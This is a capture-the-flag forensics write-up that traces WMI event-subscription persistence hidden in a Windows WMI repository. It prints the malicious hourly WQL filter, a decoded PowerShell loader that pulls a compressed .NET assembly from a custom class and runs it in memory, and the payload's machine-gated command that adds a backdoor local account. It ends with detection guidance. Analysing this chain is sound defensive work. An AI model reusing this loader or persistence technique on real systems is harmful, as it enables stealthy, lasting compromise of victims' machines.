@@ -1,0 +1,445 @@
+# HackerHolidays CTF — "After Hours" Writeup
+## Persistence Hidden in the WMI Repository
+
+---
+
+## 1. Challenge Overview
+
+> "Long after the front desk closes and the pool lights dim, the resort's
+> back-office machines keep humming. Someone, or something, has been logging in
+> during the small hours, well after the night-shift technician has gone home."
+
+Provided artifacts (in the working directory):
+
+| File          | Size      | Role                                |
+|---------------|-----------|-------------------------------------|
+| `INDEX.BTR`   | ~5.0 MB   | WMI repository index (B-tree)       |
+| `MAPPING1.MAP`| ~79 KB    | WMI repository hash table            |
+| `MAPPING2.MAP`| ~79 KB    | WMI repository hash table            |
+| `MAPPING3.MAP`| ~79 KB    | WMI repository hash table            |
+| `OBJECTS.DATA`| ~24 MB    | WMI repository object store          |
+
+Passphrase / lockbox key: `Aft3rH0ursAtt4chm3ntP4ss`
+
+Goal (from the CTF outline):
+1. Parse the provided system artifacts for hidden custom configuration data
+2. Locate the malicious class and extract its embedded payload
+3. Decode the payload and submit the recovered flag
+
+---
+
+## 2. Artifact Identification
+
+The very first step was recognizing what the files actually are. The exact
+filenames `INDEX.BTR`, `MAPPING1.MAP`, `MAPPING2.MAP`, `MAPPING3.MAP` and
+`OBJECTS.DATA` are the standard file names of the **Windows WMI Repository**
+as they exist in `C:\Windows\System32\wbem\Repository\`:
+
+```
+C:\Windows\System32\wbem\Repository\
+├── INDEX.BTR
+├── MAPPING1.MAP
+├── MAPPING2.MAP
+├── MAPPING3.MAP
+├── OBJECTS.DATA
+└── OBJECTS.MAP
+```
+
+This is the quiet corner the prompt refers to. Classic persistence-hunting
+tools (Sysinternals Autoruns, standard Scheduled Task / Run-key inspection)
+do not surface WMI event subscriptions. That is why nothing "obvious" showed
+up in Startup, Scheduled Tasks, or registry Run keys — the attacker stored
+their configuration inside the WMI class store itself.
+
+Quick confirmation of the hypothesis:
+
+```bash
+file INDEX.BTR MAPPING1.MAP MAPPING2.MAP MAPPING3.MAP OBJECTS.DATA
+# all: data
+
+strings -n 8 OBJECTS.DATA | head
+# __SystemClass, __NAMESPACE, __Win32Provider, __Provider,
+# SecurityDescriptor, ImpersonationLevel, ...  (WMI metadata)
+```
+
+---
+
+## 3. Understand the Persistence Primitive
+
+WMI **event subscription** persistence is a three-object construct:
+
+| Object                    | Purpose                                             |
+|---------------------------|-----------------------------------------------------|
+| `__EventFilter`           | The trigger — a WQL query (event/timer-based)        |
+| `__EventConsumer`         | The action — `CommandLineEventConsumer`, `ActiveScriptEventConsumer`, ... |
+| `__FilterToConsumerBinding` | The glue linking a filter to a consumer           |
+
+Timing can be driven by:
+
+- `__IntervalTimerInstruction` (fires every N seconds)
+- `__AbsoluteTimerInstruction` (fires at a specific date/time)
+- An intrinsic event like `__InstanceModificationEvent` on
+  `Win32_LocalTime` (fires on a wall-clock condition, e.g. "at minute 30
+  of every hour")
+
+The challenge narrative ("logs in during the small hours, after the night
+shift") maps directly to a wall-clock-triggered filter.
+
+---
+
+## 4. Reconnaissance of the Object Store
+
+### 4.1 Enumerate suspicious classes and instances
+
+Because the repository holds plain (mostly ASCII) class and instance names,
+`strings` is a powerful first tool:
+
+```bash
+# Class names of interest
+strings -n 6 OBJECTS.DATA | grep -E '^__' | sort -u | head
+
+# Named instances (ClassName.Name="...")
+strings -n 6 OBJECTS.DATA | grep -E '\.Name="'
+
+# Subscription / timer classes
+strings -n 6 OBJECTS.DATA | grep -iE \
+  'EventFilter|EventConsumer|FilterToConsumerBinding|TimerInstruction|ScriptText|CommandLineTemplate'
+```
+
+Windows ships stock event subscriptions (e.g.
+`__EventFilter.Name="SCM Event Log Filter"` and
+`NTEventLogEventConsumer.Name="SCM Event Log Consumer"`). Anything outside
+those defaults is a suspect.
+
+### 4.2 Locate property/value hits at byte offsets
+
+`grep -abo` prints **byte offsets** so we can `dd` windows out of the raw
+binary:
+
+```bash
+grep -abo "ScriptText" OBJECTS.DATA
+grep -abo "CommandLineTemplate" OBJECTS.DATA
+grep -abo "__EventFilter" OBJECTS.DATA
+grep -abo "__IntervalTimerInstruction" OBJECTS.DATA
+```
+
+Dumping windows around hits distinguishes **class definitions** (schema:
+property name + type + description) from **instances** (schema + actual
+values):
+
+```bash
+for off in 10254034 22173378 22476498; do
+  echo "=== @ $off ==="
+  dd if=OBJECTS.DATA bs=1 skip=$off count=800 2>/dev/null | strings -n 4
+done
+```
+
+All `ScriptText` / `CommandLineTemplate` hits turned out to be class
+*schema* only — no stock consumer instance existed. The malicious object had
+to be a **custom class**, matching the clue "locate the malicious class."
+
+---
+
+## 5. The Malicious Subscription
+
+The `__EventFilter` instances (offsets ~10.2 MB and ~22.1–22.4 MB) revealed
+the planted subscription:
+
+```
+__EventFilter
+root\cimv2
+EngineTelemetryFilter
+SELECT * FROM __InstanceModificationEvent WITHIN 60
+WHERE TargetInstance ISA 'Win32_LocalTime'
+AND TargetInstance.Minute = 30
+CommandLineEventConsumer
+cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <base64...>
+```
+
+**Analysis:**
+
+- Filter name `EngineTelemetryFilter` — a deliberately innocuous, telemetry-flavored name.
+- WQL trigger: `__InstanceModificationEvent ... Win32_LocalTime ... Minute = 30` → fires every hour at `:30`. This is the "small hours" behaviour.
+- Consumer: `CommandLineEventConsumer` launching PowerShell hidden with an encoded command.
+- Target namespace: `root\cimv2`.
+
+---
+
+## 6. Decode Stage 1 — the PowerShell Loader
+
+### 6.1 Extract the full `-enc` blob
+
+```bash
+grep -abo '\-enc ' OBJECTS.DATA
+# 1308918:-enc
+# 10254582:-enc
+# 22173942:-enc
+# 22477046:-enc
+
+dd if=OBJECTS.DATA bs=1 skip=10254582 count=6000 2>/dev/null \
+  | grep -aoE '[A-Za-z0-9+/]{80,}=' | head -1 > /tmp/enc.b64
+
+base64 -d /tmp/enc.b64 | iconv -f UTF-16LE -t UTF-8
+```
+
+PowerShell `-enc` arguments are base64 of **UTF-16LE**. Decoding yields the
+loader:
+
+```powershell
+$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry')
+        .Properties['ConfigData'].Value;
+$o = New-Object IO.MemoryStream;
+$d = New-Object IO.Compression.DeflateStream(
+        [IO.MemoryStream][Convert]::FromBase64String($file),
+        [IO.Compression.CompressionMode]::Decompress);
+$b = New-Object Byte[](1024);
+$r = $d.Read($b,0,1024);
+while($r -gt 0){
+    $o.Write($b,0,$r);
+    $r = $d.Read($b,0,1024);
+}
+[Reflection.Assembly]::Load($o.ToArray()).EntryPoint
+    .Invoke($null,@(,[string[]]@()))|Out-Null
+```
+
+**What it does:**
+
+1. Queries a **custom class** `Win32_HardwareTelemetry` in `root\cimv2`.
+2. Reads its `ConfigData` property (a base64 string).
+3. base64-decodes and **DeflateStream**-decompresses it (raw DEFLATE).
+4. `Assembly.Load` + `EntryPoint.Invoke` → executes the resulting .NET
+   assembly in memory.
+
+`Win32_HardwareTelemetry` is **not** a real Microsoft WMI class — it is the
+"malicious class" the challenge asks us to find, and `ConfigData` is the
+"hidden custom configuration data."
+
+---
+
+## 7. Decode Stage 2 — the Embedded Payload
+
+### 7.1 Locate the `ConfigData` value
+
+```bash
+grep -abo "Win32_HardwareTelemetry" OBJECTS.DATA
+# 578858:Win32_HardwareTelemetry
+# 2659626:Win32_HardwareTelemetry
+# 9286954:Win32_HardwareTelemetry
+# 22467882:Win32_HardwareTelemetry
+```
+
+All four copies held the same `ConfigData` base64 blob (the repository keeps
+mirrors/copies of objects). Dumping around offset `578858`:
+
+```bash
+dd if=OBJECTS.DATA bs=1 skip=578858 count=2500 2>/dev/null \
+  | grep -aoE '[A-Za-z0-9+/]{200,}=' | head -1 > /tmp/config.b64
+```
+
+### 7.2 Replicate the loader locally (Python)
+
+`.NET DeflateStream` is **raw DEFLATE** (no zlib header), so the correct
+Python decompression is `zlib.decompress(data, -15)`:
+
+```python
+import base64, zlib
+b64 = open('/tmp/config.b64').read().strip()
+raw = base64.b64decode(b64)
+data = zlib.decompress(raw, -15)          # raw DEFLATE = .NET DeflateStream
+open('/tmp/payload.bin', 'wb').write(data)
+```
+
+Result:
+
+```
+/tmp/payload.bin: PE32 executable for MS Windows 4.00 (GUI),
+Intel i386 Mono/.Net assembly, 3 sections
+```
+
+The payload is a .NET executable.
+
+---
+
+## 8. Decode Stage 3 — the .NET Assembly
+
+### 8.1 Preliminary strings
+
+```bash
+strings -n 6 /tmp/payload.bin | head -40
+```
+
+Reveals:
+
+- Assembly / internal name: `updates.exe`
+- Namespace `AfterHours`, class `Program`
+- References: `Environment.get_MachineName`, `StringComparison.Equals`,
+  `ProcessStartInfo`, `set_FileName`, `set_Arguments`,
+  `set_WindowStyle`, `set_CreateNoWindow`, `Process`, `Console.WriteLine`
+
+### 8.2 UTF-16 user strings (the literals `strings` misses)
+
+.NET literal strings are stored UTF-16 in the `#US` heap, so 8-bit `strings`
+misses them. Use `strings -el` (little-endian 16-bit):
+
+```bash
+strings -el /tmp/payload.bin | head -40
+```
+
+Output contains the important literals:
+
+```
+bytelotusdc
+cmd.exe
+/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
+Execution halted: Environment mismatch.
+```
+
+### 8.3 Disassemble to IL
+
+```bash
+monodis --output=/tmp/payload.il /tmp/payload.bin
+grep -nE "Program|Main|AfterHours|MachineName|ProcessStartInfo|FileName|Arguments|ldstr" /tmp/payload.il
+```
+
+`Program::Main` logic:
+
+```
+IL_0000: call  Environment::get_MachineName()
+IL_0005: ldstr "bytelotusdc"
+         ... StringComparison.Equals ...            ; environment gate
+IL_0012: newobj ProcessStartInfo::'.ctor'()
+IL_0019: ldstr "cmd.exe"
+         callvirt set_FileName
+IL_0024: ldstr "/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add"
+         callvirt set_Arguments
+         callvirt set_WindowStyle(...)
+         callvirt set_CreateNoWindow(true)
+IL_003d: call Process::Start(...)
+IL_0045: ldstr "Execution halted: Environment mismatch."   ; anti-forensics path
+```
+
+**Behaviour:**
+
+- Gate: only runs on a host whose `MachineName` equals `bytelotusdc`
+  (environment fingerprinting / anti-analysis — a sandbox or analyst box
+  won't trigger it).
+- On match: launches `cmd.exe /c net user patch <base64> /add`
+  (hidden, no window) — creates a local user account.
+- On mismatch: prints "Execution halted: Environment mismatch." and exits.
+
+The credential/flag material is the base64 argument:
+`VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9`
+
+### 8.4 Final decode
+
+```bash
+echo 'VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9' | base64 -d
+```
+
+```
+THM{P4tch_op3ned_t3n_BacKd00r}
+```
+
+---
+
+## 9. Recovered Flag
+
+```
+THM{P4tch_op3ned_t3n_BacKd00r}
+```
+
+(THM = TryHackMe flag format.)
+
+---
+
+## 10. Full Kill Chain Summary
+
+```
+WMI __EventFilter "EngineTelemetryFilter"
+   └─ WQL: Win32_LocalTime Minute = 30   (fires every hour at :30)
+        └─ CommandLineEventConsumer
+             └─ powershell.exe -enc <loader>
+                  └─ reads Win32_HardwareTelemetry.ConfigData   (custom class)
+                       └─ base64 -> raw DEFLATE (zlib -15)
+                            └─ .NET assembly updates.exe
+                                 └─ MachineName == "bytelotusdc" ?
+                                      ├─ yes -> cmd /c net user patch <b64> /add
+                                      └─ no  -> "Execution halted."
+```
+
+Three hiding tricks in one chain:
+
+1. **WMI repository** as the persistence location — invisible to most
+   autoruns-type tooling.
+2. **Custom class** (`Win32_HardwareTelemetry`) holding the payload in a
+   config property — data hidden in plain sight among thousands of
+   legitimate objects.
+3. **In-memory execution** — the .NET assembly never touches disk as a file;
+   it is deflated out of a base64 blob and loaded via `Assembly.Load`.
+   Plus an environment check to evade analysis boxes.
+
+The passphrase `Aft3rH0ursAtt4chm3ntP4ss` is thematic flavor ("After Hours /
+Attachment / Pass"); the payload's `AfterHours` namespace and the final
+backdoor credential tie back to it narratively.
+
+---
+
+## 11. Detection & Defense (Blue-Team Notes)
+
+Hunt for WMI event subscription persistence:
+
+```powershell
+# Live query — enumeration
+Get-WmiObject -Namespace root\subscription -Class __EventFilter
+Get-WmiObject -Namespace root\subscription -Class __EventConsumer
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
+Get-WmiObject -Namespace root\subscription -Class __IntervalTimerInstruction
+
+# Modern cmdlet equivalents
+Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
+Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer
+```
+
+Signals to look for:
+
+- Non-default `__EventFilter` / consumer names (compare against a
+  known-good baseline).
+- `CommandLineEventConsumer` with `powershell.exe -enc`, `cmd /c`, or
+  base64-heavy `CommandLineTemplate`.
+- `ActiveScriptEventConsumer` with embedded `ScriptText`.
+- Custom classes that shadow legitimate naming schemes
+  (`Win32_*`, `MSFT_*`, `__*`) but aren't stock — audit
+  `root\cimv2` for unknown class definitions.
+- Timer-driven triggers tied to wall-clock conditions
+  (`Win32_LocalTime`, `__IntervalTimerInstruction`).
+
+Operational detections:
+
+- Sysmon Event ID 1: watch `cmd.exe /c net user * /add` and `-enc`
+  PowerShell launches with `-Window Hidden`.
+- Monitor WMI activity: Sysmon Event ID 19–21 (WmiEventFilter /
+  WmiEventConsumer / WmiEventBinding).
+- Event log `Microsoft-Windows-Sysmon/Operational` and
+  `Microsoft-Windows-WMI-Activity/Operational` (WMI creation events).
+- Periodically export and hash/diff the WMI repository
+  (`C:\Windows\System32\wbem\Repository\OBJECTS.DATA`) against a
+  trusted baseline; unexpected changes indicate repository tampering.
+- Check for unexpected local accounts / recent
+  `net user <name> ... /add` account creation (also Event ID 4720).
+
+---
+
+## 12. Tools & Commands Recap
+
+| Step | Tool | Command |
+|------|------|---------|
+| Identify repo | `file`, `strings` | `strings -n 8 OBJECTS.DATA \| head` |
+| Enumerate objects | `strings`, `grep` | `strings -n 6 OBJECTS.DATA \| grep -E '\.Name="'` |
+| Find offsets | `grep -abo` | `grep -abo "ScriptText" OBJECTS.DATA` |
+| Dump bytes | `dd`, `strings` | `dd if=OBJECTS.DATA bs=1 skip=<off> count=800` |
+| Decode PS loader | `base64`, `iconv` | `base64 -d file \| iconv -f UTF-16LE -t UTF-8` |
+| Decompress payload | Python `zlib` | `zlib.decompress(raw, -15)` |
+| ID payload | `file` | `file /tmp/payload.bin` |
+| UTF-16 strings | `strings -el` | `strings -el /tmp/payload.bin` |
+| Disassemble .NET | `monodis` | `monodis --output=out.il payload.bin` |
+| Final decode | `base64` | `echo '<b64>' \| base64 -d` |
